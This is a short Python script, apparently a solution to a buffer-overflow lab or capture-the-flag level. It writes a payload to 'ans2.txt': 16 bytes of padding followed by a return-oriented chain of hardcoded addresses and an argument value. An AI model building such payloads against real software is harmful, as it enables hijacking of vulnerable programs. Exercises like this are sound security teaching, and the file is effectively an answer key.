def p64(x: int) -> bytes:
    return x.to_bytes(8, "little")

payload = b"A"*16 + p64(0x401190) + p64(0x4012c7) + p64(0x3f8) + p64(0x401216)
open("ans2.txt", "wb").write(payload)